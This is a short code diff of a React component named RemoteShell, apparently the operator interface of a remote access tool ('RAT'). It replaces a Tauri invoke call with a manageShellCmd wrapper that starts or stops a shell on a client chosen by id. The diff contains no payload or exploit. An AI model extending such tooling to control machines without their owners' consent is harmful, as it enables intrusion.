@@ -1,14 +1,14 @@
 import { useParams } from "react-router-dom";
 import { useEffect, useState } from "react";
 import { Ascii, Command, Header } from "../components/Shell";
-import { invoke } from "@tauri-apps/api/tauri";
+import { manageShellCmd } from "../rat/RATCommands";
 
 export const RemoteShell: React.FC = () => {
   const { id } = useParams();
   const [shellStatus, setShellStatus] = useState<string>("false");
 
   async function manage_shell(id: string, run: string) {
-    const ok: string = await invoke("manage_shell", { id, run });
+    const ok: string = await manageShellCmd(id, run);
     setShellStatus(ok);
   }
 
